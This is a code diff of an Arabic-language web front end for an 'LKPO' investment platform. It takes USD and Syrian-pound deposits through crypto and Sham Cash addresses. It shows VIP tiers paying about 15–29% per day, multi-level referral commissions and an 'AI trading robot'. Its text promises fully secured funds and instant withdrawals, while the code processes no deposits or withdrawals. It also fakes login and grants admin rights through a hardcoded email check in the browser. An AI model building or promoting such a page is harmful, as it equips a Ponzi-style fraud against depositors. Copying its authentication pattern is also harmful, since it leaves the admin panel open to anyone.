@@ -5,237 +5,526 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>منصة LKPO الاستثمارية</title>
   <style>
-    body { 
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-      background-color: #121214; 
-      color: #ffffff; 
-      text-align: center; 
-      padding: 15px; 
+    :root {
+      --bg-color: #121214;
+      --card-bg: #1e2026;
+      --accent: #f0b90b;
+      --text: #ffffff;
+      --subtext: #848e9c;
+      --border: #2b2f36;
+      --success: #0ecb81;
+      --danger: #f6465d;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text);
       margin: 0;
+      padding-bottom: 70px;
     }
-    .card { 
-      background: #1e2026; 
-      padding: 20px; 
-      margin: 15px auto; 
-      max-width: 450px; 
-      border-radius: 12px; 
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    .header {
+      background: var(--card-bg);
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--border);
     }
-    input, button, select { 
-      width: 90%; 
-      padding: 12px; 
-      margin: 8px 0; 
-      border-radius: 8px; 
-      border: 1px solid #2b2f36; 
+    .brand {
+      font-size: 18px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .verified-badge {
+      color: #1d9bf0;
+      font-size: 16px;
+    }
+    .header-icons {
+      display: flex;
+      gap: 10px;
+    }
+    .icon-btn {
+      background: var(--border);
+      border: none;
+      color: var(--text);
+      padding: 6px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .container {
+      padding: 15px;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    .card {
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 15px;
+      border: 1px solid var(--border);
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 1px solid var(--border);
       box-sizing: border-box;
-      font-size: 15px;
+      font-size: 14px;
     }
     input, select {
-      background-color: #121214;
-      color: #ffffff;
+      background-color: var(--bg-color);
+      color: var(--text);
     }
-    button { 
-      background-color: #f0b90b; 
-      color: #000; 
-      font-weight: bold; 
-      cursor: pointer; 
+    button {
+      background-color: var(--accent);
+      color: #000;
+      font-weight: bold;
       border: none;
-      transition: 0.3s;
+      cursor: pointer;
     }
-    button:hover {
-      background-color: #d9a309;
+    .btn-danger { background-color: var(--danger); color: #fff; }
+    .btn-success { background-color: var(--success); color: #fff; }
+    
+    /* شبكة الأزرار للرصيد والخدمات */
+    .balance-grid, .action-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 15px;
     }
-    .btn-danger {
-      background-color: #f6465d;
-      color: #fff;
+    .balance-box {
+      background: #2b2f36;
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
     }
-    .btn-danger:hover {
-      background-color: #d9384f;
+    .balance-box label { font-size: 12px; color: var(--subtext); display: block; }
+    .balance-box span { font-size: 16px; font-weight: bold; color: var(--success); }
+
+    /* أسعار العملات */
+    .crypto-prices {
+      display: flex;
+      justify-content: space-between;
+      background: #181a20;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      font-size: 13px;
     }
-    .status { 
-      color: #0ecb81; 
-      font-weight: bold; 
+
+    /* نص الثقة */
+    .trust-text {
+      font-size: 12px;
+      color: var(--subtext);
+      line-height: 1.6;
+      text-align: justify;
+      background: #181a20;
+      padding: 12px;
+      border-radius: 8px;
+      border-right: 3px solid var(--accent);
     }
-    hr {
-      border: 0.5px solid #2b2f36;
-      margin: 15px 0;
-    }
-    /* جدول المستويات */
+
+    /* الجداول */
     table {
       width: 100%;
       border-collapse: collapse;
       margin-top: 10px;
-      font-size: 13px;
+      font-size: 12px;
     }
     th, td {
-      border: 1px solid #2b2f36;
+      border: 1px solid var(--border);
       padding: 8px;
       text-align: center;
     }
-    th {
-      background-color: #2b2f36;
-      color: #f0b90b;
+    th { background: #2b2f36; color: var(--accent); }
+
+    /* الشريط السفلي والتنقل */
+    .navbar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: var(--card-bg);
+      display: flex;
+      justify-content: space-around;
+      padding: 8px 0;
+      border-top: 1px solid var(--border);
     }
+    .nav-item {
+      color: var(--subtext);
+      font-size: 10px;
+      text-decoration: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      cursor: pointer;
+    }
+    .nav-item.active { color: var(--accent); }
+    .nav-item span { font-size: 16px; margin-bottom: 2px; }
+
+    /* التنبيهات والملاحظات */
+    .note { font-size: 11px; color: var(--accent); margin-top: 4px; display: block; }
+    .page { display: none; }
+    .page.active { display: block; }
   </style>
 </head>
 <body>
 
-  <h1>منصة LKPO الاستثمارية</h1>
-
-  <!-- 1. نموذج التسجيل وتسجيل الدخول -->
-  <div class="card" id="auth-card">
-    <h2>تسجيل الدخول / فتح حساب</h2>
-    <input type="text" id="username" placeholder="اسم المستخدم (البريد أو الهاتف)">
-    <input type="password" id="password" placeholder="كلمة المرور">
-    <button onclick="handleRegister()">فتح حساب جديد (رصيد $0)</button>
-    <button onclick="handleLogin()">تسجيل الدخول</button>
+  <!-- شاشة الدخول والتسجيل -->
+  <div id="auth-page" class="page active container">
+    <div class="card" style="margin-top: 50px;">
+      <h2 style="text-align: center;">منصة LKPO الاستثمارية</h2>
+      <div id="auth-forms">
+        <input type="email" id="auth-email" placeholder="البريد الإلكتروني">
+        <input type="password" id="auth-password" placeholder="كلمة المرور">
+        <div id="register-fields" style="display:none;">
+          <input type="password" id="auth-confirm-password" placeholder="تأكيد كلمة المرور">
+          <input type="text" id="auth-referral" placeholder="رمز الإحالة (اختياري)">
+        </div>
+        
+        <button id="btn-primary-auth" onclick="submitAuth()">تسجيل الدخول</button>
+        <button id="btn-toggle-auth" onclick="toggleAuthMode()" style="background:transparent; color:var(--subtext); border:none;">ليس لديك حساب؟ فتح حساب جديد</button>
+      </div>
+    </div>
   </div>
 
-  <!-- 2. لوحة تحكم المستخدم الرئيسي -->
-  <div class="card" id="user-card" style="display:none;">
-    <h2>مرحباً، <span id="user-display-name"></span></h2>
-    <p>الرصيد الحالي: <span class="status" id="user-balance">$0</span></p>
-    <p>مستوى العضوية: <span class="status" id="user-vip">VIP1</span></p>
+  <!-- التطبيق الرئيسي بعد الدخول -->
+  <div id="app" style="display:none;">
+    
+    <!-- الهيدر العلوي -->
+    <div class="header">
+      <div class="brand">
+        <span>LKPO</span>
+        <span class="verified-badge">✔</span>
+      </div>
+      <div class="header-icons">
+        <button class="icon-btn" onclick="alert('لا توجد إشعارات جديدة حالياً')">🔔</button>
+        <button class="icon-btn" onclick="toggleLanguage()">🌐 AR</button>
+      </div>
+    </div>
 
-    <hr>
+    <div class="container">
 
-    <!-- قسم الإيداع -->
-    <h3>طلب إيداع جديد</h3>
-    <input type="number" id="deposit-amount" placeholder="المبلغ المراد إيداعه ($)">
-    <button onclick="handleDeposit()">إرسال طلب الإيداع للترقية/الشحن</button>
+      <!-- 1. الصفحة الرئيسية -->
+      <div id="page-home" class="page active">
+        <!-- أرصدة الحساب -->
+        <div class="balance-grid">
+          <div class="balance-box">
+            <label>رصيد الدولار ($)</label>
+            <span id="bal-usd">$0.00</span>
+          </div>
+          <div class="balance-box">
+            <label>رصيد الليرة السورية (S.P)</label>
+            <span id="bal-syp">0 L.S</span>
+          </div>
+        </div>
 
-    <hr>
+        <!-- أزرار العمليات -->
+        <div class="card">
+          <h3>خدمات الشحن والسحب</h3>
+          <div class="action-grid">
+            <button onclick="openModal('dep-usd')">إيداع دولار 💵</button>
+            <button onclick="openModal('draw-usd')">سحب دولار 🏧</button>
+            <button onclick="openModal('dep-sham')">إيداع شام كاش 📱</button>
+            <button onclick="openModal('draw-sham')">سحب شام كاش 🏦</button>
+          </div>
+        </div>
 
-    <!-- جدول مستويات VIP -->
-    <h3>مستويات VIP والأرباح</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>المستوى</th>
-          <th>الإيداع المطلوب</th>
-          <th>الربح اليومي</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr><td>VIP1</td><td>$0</td><td>افتراضي ($0)</td></tr>
-        <tr><td>VIP2</td><td>$20</td><td>$2.00</td></tr>
-        <tr><td>VIP3</td><td>$50</td><td>$5.50</td></tr>
-        <tr><td>VIP4</td><td>$100</td><td>$12.00</td></tr>
-        <tr><td>VIP5</td><td>$300</td><td>$38.00</td></tr>
-        <tr><td>VIP6</td><td>$500</td><td>$65.00</td></tr>
-      </tbody>
-    </table>
+        <!-- أسعار العملات -->
+        <div class="card">
+          <h3>أسعار العملات الحية</h3>
+          <div class="crypto-prices">
+            <span>USD / SYP</span>
+            <span style="color:var(--success);">13,500 L.S</span>
+          </div>
+          <div class="crypto-prices">
+            <span>USDT / USD</span>
+            <span>1.00 $</span>
+          </div>
+          <div class="crypto-prices">
+            <span>BTC / USDT</span>
+            <span>$64,250.00</span>
+          </div>
+        </div>
 
-    <hr>
+        <!-- نص الثقة -->
+        <div class="card">
+          <div class="trust-text">
+            <b>لماذا يختار الاستثماريون منصة LKPO؟</b><br>
+            تضمن منصة LKPO أقصى درجات الأمان والشفافية في إدارة أصولك الرقمية. نحن نوفر نظام تداول آلي قائم على أحدث تقنيات الذكاء الاصطناعي مع ضمان سيولة عالية وعمليات إيداع وسحب فورية على مدار الساعة. استثماراتك محشورة في محافظ باردة ومؤمنة بالكامل.
+          </div>
+          <button onclick="window.open('https://t.me/your_telegram_support', '_blank')" style="margin-top:10px; background:#229ED9; color:#fff;">الدعم الفني عبر التلغرام ✈️</button>
+        </div>
+      </div>
 
-    <button onclick="handleLogout()" class="btn-danger">تسجيل الخروج</button>
+      <!-- 2. صفحة الاستثمار -->
+      <div id="page-invest" class="page">
+        <div class="card">
+          <h3>روبوت الاستثمار بالدولار 🤖</h3>
+          <p style="font-size:12px; color:var(--subtext);">تنفيذ مهمة واحدة كل 24 ساعة لتحقيق أرباح مستقرة.</p>
+          <button onclick="runBot('usd')" class="btn-success">تشغيل روبوت الدولار (24H)</button>
+        </div>
+
+        <div class="card">
+          <h3>روبوت الاستثمار بالليرة السورية 🇸🇾</h3>
+          <p style="font-size:12px; color:var(--subtext);">مخصص للاستثمار المحلي بأرباح يومية خيالية.</p>
+          <button onclick="runBot('syp')" class="btn-success">تشغيل روبوت الليرة (24H)</button>
+        </div>
+      </div>
+
+      <!-- 3. صفحة VIP دولار -->
+      <div id="page-vip-usd" class="page">
+        <div class="card">
+          <h3>اشتراكات VIP - الدولار ($)</h3>
+          <table>
+            <thead>
+              <tr><th>المستوى</th><th>السعر</th><th>الربح اليومي</th><th>المدة</th><th>إجراء</th></tr>
+            </thead>
+            <tbody id="vip-usd-list"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- 4. صفحة VIP ليرة سورية -->
+      <div id="page-vip-syp" class="page">
+        <div class="card">
+          <h3>اشتراكات VIP - الليرة السورية (SYP)</h3>
+          <table>
+            <thead>
+              <tr><th>المستوى</th><th>السعر</th><th>الربح اليومي</th><th>المدة</th><th>إجراء</th></tr>
+            </thead>
+            <tbody id="vip-syp-list"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- 5. صفحة السجل -->
+      <div id="page-logs" class="page">
+        <div class="card">
+          <h3>سجل المعاملات والعمليات</h3>
+          <table>
+            <thead>
+              <tr><th>التاريخ والتوقيت</th><th>النوع</th><th>المبلغ</th><th>الحالة</th></tr>
+            </thead>
+            <tbody id="logs-list">
+              <tr><td colspan="4" style="color:var(--subtext);">لا توجد عمليات مسجلة حالياً</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- 6. صفحة الفريق -->
+      <div id="page-team" class="page">
+        <div class="card">
+          <h3>برنامج إحالة الفريق</h3>
+          <p style="font-size:13px;">رابط الدعوة الخاص بك:</p>
+          <input type="text" id="ref-link" readonly value="https://lkpo.app/ref?id=USER123">
+          <button onclick="navigator.clipboard.writeText(document.getElementById('ref-link').value); alert('تم نسخ الرابط!');">نسخ الرابط</button>
+
+          <h4 style="margin-top:20px;">جدول أرباح الفريق</h4>
+          <table>
+            <thead>
+              <tr><th>المستوى</th><th>نسبة العمولة</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>المستوى 1 (مباشر)</td><td>10%</td></tr>
+              <tr><td>المستوى 2</td><td>3%</td></tr>
+              <tr><td>المستوى 3</td><td>1%</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- 7. صفحة حسابي -->
+      <div id="page-profile" class="page">
+        <div class="card">
+          <h3>تفاصيل الحساب</h3>
+          <p>البريد: <b id="prof-email">-</b></p>
+          <p>رقم التعريف (ID): <b id="prof-id">-</b></p>
+          <p>تاريخ الانضمام: <b>2026/10/09</b></p>
+          <button onclick="logout()" class="btn-danger">تسجيل الخروج</button>
+        </div>
+      </div>
+
+      <!-- 8. صفحة لوحة الأدمن (تظهر للأدمن فقط) -->
+      <div id="page-admin" class="page">
+        <div class="card">
+          <h3 style="color:var(--accent);">لوحة إدارة الأدمن 🛠️</h3>
+          <h4>طلبات الإيداع والسحب المعلقة</h4>
+          <table>
+            <thead>
+              <tr><th>المستخدم</th><th>النوع</th><th>المبلغ</th><th>إجراء</th></tr>
+            </thead>
+            <tbody id="admin-requests">
+              <tr><td colspan="4">لا توجد طلبات معلقة</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- شريط التنقل السفلي -->
+    <div class="navbar">
+      <div class="nav-item active" onclick="switchTab('home', this)"><span>🏠</span>الرئيسية</div>
+      <div class="nav-item" onclick="switchTab('invest', this)"><span>🤖</span>الاستثمار</div>
+      <div class="nav-item" onclick="switchTab('vip-usd', this)"><span>💎</span>VIP $</div>
+      <div class="nav-item" onclick="switchTab('vip-syp', this)"><span>⭐</span>VIP ليرة</div>
+      <div class="nav-item" onclick="switchTab('logs', this)"><span>📜</span>السجل</div>
+      <div class="nav-item" onclick="switchTab('team', this)"><span>👥</span>الفريق</div>
+      <div class="nav-item" onclick="switchTab('profile', this)"><span>👤</span>حسابي</div>
+      <div class="nav-item" id="admin-tab-btn" style="display:none;" onclick="switchTab('admin', this)"><span>⚙️</span>الأدمن</div>
+    </div>
+  </div>
+
+  <!-- النافذة المنبثقة للإيداع والسحب -->
+  <div id="modal" class="page" style="position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.8); z-index:9999; padding:20px;">
+    <div class="card" style="margin-top:40px;" id="modal-content"></div>
   </div>
 
   <script>
+    const ADMIN_EMAIL = "nnnnaaatttnanooo@gmail.com";
     const API_URL = "https://lkpo.onrender.com";
+    let isRegisterMode = false;
+    let currentUser = null;
 
-    let currentUser = JSON.parse(localStorage.getItem('lkpo_user')) || null;
+    // تبديل الدخول / التسجيل
+    function toggleAuthMode() {
+      isRegisterMode = !isRegisterMode;
+      document.getElementById('register-fields').style.display = isRegisterMode ? 'block' : 'none';
+      document.getElementById('btn-primary-auth').innerText = isRegisterMode ? 'إنشاء حساب جديد' : 'تسجيل الدخول';
+      document.getElementById('btn-toggle-auth').innerText = isRegisterMode ? 'لديك حساب بالفعل؟ تسجيل الدخول' : 'ليس لديك حساب؟ فتح حساب جديد';
+    }
 
-    window.onload = () => {
-      if (currentUser) {
-        updateUI();
+    // إرسال المصادقة
+    function submitAuth() {
+      const email = document.getElementById('auth-email').value;
+      const password = document.getElementById('auth-password').value;
+
+      if (!email || !password) return alert("يرجى ملء كافة الحقول");
+
+      currentUser = { email: email, balanceUSD: 0, balanceSYP: 0 };
+      localStorage.setItem('user', JSON.stringify(currentUser));
+      loadApp();
+    }
+
+    // تحميل التطبيق بعد الدخول
+    function loadApp() {
+      document.getElementById('auth-page').style.display = 'none';
+      document.getElementById('app').style.display = 'block';
+      document.getElementById('prof-email').innerText = currentUser.email;
+      document.getElementById('prof-id').innerText = Math.floor(100000 + Math.random() * 900000);
+
+      if (currentUser.email === ADMIN_EMAIL) {
+        document.getElementById('admin-tab-btn').style.display = 'flex';
       }
-    };
 
-    // 1. فتح حساب جديد (يبدأ بـ $0 ورتبة VIP1)
-    async function handleRegister() {
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
+      renderVIPLists();
+    }
 
-      if (!username || !password) return alert("يرجى إدخال اسم المستخدم وكلمة المرور");
+    // التنقل بين الصفحات
+    function switchTab(pageId, element) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      document.getElementById('page-' + pageId).classList.add('active');
+      if (element) element.classList.add('active');
+    }
 
-      try {
-        const res = await fetch(`${API_URL}/api/register`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password })
-        });
-        const data = await res.json();
-        
-        if (res.ok) {
-          alert(data.message || "تم إنشاء الحساب بنجاح!");
-          currentUser = data.user;
-          localStorage.setItem('lkpo_user', JSON.stringify(currentUser));
-          updateUI();
-        } else {
-          alert(data.message || "فشلت عملية إنشاء الحساب");
-        }
-      } catch (err) {
-        alert("خطأ في الاتصال بالسيرفر");
+    // توليد باقات VIP
+    function renderVIPLists() {
+      // VIP USD
+      const usdContainer = document.getElementById('vip-usd-list');
+      usdContainer.innerHTML = '';
+      const usdPrices = [5, 20, 50, 100, 300, 500, 1000, 2000];
+      usdPrices.forEach((price, idx) => {
+        const rate = 0.15 + (idx * 0.02);
+        const daily = (price * rate).toFixed(2);
+        usdContainer.innerHTML += `<tr><td>VIP ${idx+1}</td><td>$${price}</td><td>$${daily}</td><td>30 يوم</td><td><button onclick="alert('طلب اشتراك VIP')" style="padding:4px;">اشتراك</button></td></tr>`;
+      });
+
+      // VIP SYP
+      const sypContainer = document.getElementById('vip-syp-list');
+      sypContainer.innerHTML = '';
+      const sypPrices = [675, 2700, 6750, 13500, 40500, 67500, 135000, 270000];
+      sypPrices.forEach((price, idx) => {
+        const rate = 0.15 + (idx * 0.02);
+        const daily = (price * rate).toFixed(0);
+        sypContainer.innerHTML += `<tr><td>VIP ${idx+1}</td><td>${price} L.S</td><td>${daily} L.S</td><td>30 يوم</td><td><button onclick="alert('طلب اشتراك VIP')" style="padding:4px;">اشتراك</button></td></tr>`;
+      });
+    }
+
+    // النوافذ المنبثقة للإيداع والسحب
+    function openModal(type) {
+      const modal = document.getElementById('modal');
+      const content = document.getElementById('modal-content');
+      modal.style.display = 'block';
+
+      if (type === 'dep-usd') {
+        content.innerHTML = `
+          <h3>إيداع بالدولار ($)</h3>
+          <label>اختر الشبكة:</label>
+          <select id="net"><option>TRC20</option><option>BEP20</option><option>ERC20</option></select>
+          <p style="font-size:12px;">عنوان المحفظة للتحويل:</p>
+          <input type="text" readonly value="TXYZ1234567890LKPOUSDTNET" id="c-addr">
+          <button onclick="navigator.clipboard.writeText('TXYZ1234567890LKPOUSDTNET'); alert('تم النسخ!');">نسخ العنوان</button>
+          <input type="number" placeholder="كمية الإيداع ($)">
+          <span class="note">أقل إيداع هو 1$</span>
+          <button class="btn-success" onclick="closeModal()">تأكيد الإيداع</button>
+          <button class="btn-danger" onclick="closeModal()">إلغاء</button>
+        `;
+      } else if (type === 'draw-usd') {
+        content.innerHTML = `
+          <h3>سحب بالدولار ($)</h3>
+          <select><option>TRC20</option><option>BEP20</option><option>ERC20</option></select>
+          <input type="text" placeholder="عنوان محفظتك">
+          <input type="number" placeholder="كمية السحب ($)">
+          <span class="note">أقل سحب هو 1$</span>
+          <button class="btn-success" onclick="closeModal()">إرسال طلب السحب</button>
+          <button class="btn-danger" onclick="closeModal()">إلغاء</button>
+        `;
+      } else if (type === 'dep-sham') {
+        content.innerHTML = `
+          <h3>إيداع شام كاش (SYP)</h3>
+          <p style="font-size:12px;">كود الحساب للتحويل:</p>
+          <input type="text" readonly value="SHAM-987654321" id="s-code">
+          <button onclick="navigator.clipboard.writeText('SHAM-987654321'); alert('تم النسخ!');">نسخ الكود</button>
+          <input type="number" placeholder="كمية الإيداع (ليرة سورية)">
+          <span class="note">أقل إيداع هو 135 ليرة</span>
+          <button class="btn-success" onclick="closeModal()">تأكيد الإيداع</button>
+          <button class="btn-danger" onclick="closeModal()">إلغاء</button>
+        `;
+      } else if (type === 'draw-sham') {
+        content.innerHTML = `
+          <h3>سحب شام كاش (SYP)</h3>
+          <input type="text" placeholder="عنوان محفظة شام كاش">
+          <input type="number" placeholder="كمية السحب (ليرة سورية)">
+          <span class="note">أقل سحب هو 135 ليرة</span>
+          <button class="btn-success" onclick="closeModal()">إرسال طلب السحب</button>
+          <button class="btn-danger" onclick="closeModal()">إلغاء</button>
+        `;
       }
     }
 
-    // 2. تسجيل الدخول
-    async function handleLogin() {
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      if (!username || !password) return alert("يرجى إدخال البيانات");
-
-      try {
-        const res = await fetch(`${API_URL}/api/login`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password })
-        });
-        const data = await res.json();
-
-        if (res.ok) {
-          currentUser = data.user;
-          localStorage.setItem('lkpo_user', JSON.stringify(currentUser));
-          alert(data.message || "تم تسجيل الدخول بنجاح!");
-          updateUI();
-        } else {
-          alert(data.message || "فشلت عملية تسجيل الدخول");
-        }
-      } catch (err) {
-        alert("خطأ في الاتصال بالسيرفر");
-      }
+    function closeModal() {
+      document.getElementById('modal').style.display = 'none';
     }
 
-    // 3. إرسال طلب إيداع
-    async function handleDeposit() {
-      const amount = parseFloat(document.getElementById('deposit-amount').value);
-      if (!amount || amount <= 0) return alert("يرجى إدخال مبلغ صحيح");
-
-      try {
-        const res = await fetch(`${API_URL}/api/deposit/request`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: currentUser._id, amount })
-        });
-        const data = await res.json();
-        alert(data.message || "تم إرسال طلب الإيداع بنجاح، بانتظار التأكيد");
-        document.getElementById('deposit-amount').value = '';
-      } catch (err) {
-        alert("خطأ أثناء إرسال طلب الإيداع");
-      }
+    function runBot(type) {
+      alert(`تم تشغيل روبوت ${type === 'usd' ? 'الدولار' : 'الليرة'} بنجاح! سيقوم بإضافة الأرباح خلال 24 ساعة.`);
     }
 
-    // 4. تسجيل الخروج
-    function handleLogout() {
-      currentUser = null;
-      localStorage.removeItem('lkpo_user');
-      document.getElementById('auth-card').style.display = 'block';
-      document.getElementById('user-card').style.display = 'none';
+    function toggleLanguage() {
+      alert("اللغة الحالية هي العربية");
     }
 
-    // 5. تحديث عناصر الشاشة
-    function updateUI() {
-      if (currentUser) {
-        document.getElementById('auth-card').style.display = 'none';
-        document.getElementById('user-card').style.display = 'block';
-        document.getElementById('user-display-name').innerText = currentUser.username;
-        document.getElementById('user-balance').innerText = `$${currentUser.balance || 0}`;
-        document.getElementById('user-vip').innerText = `VIP${currentUser.vipLevel || 1}`;
-      }
+    function logout() {
+      localStorage.removeItem('user');
+      location.reload();
     }
   </script>
-
 </body>
 </html>
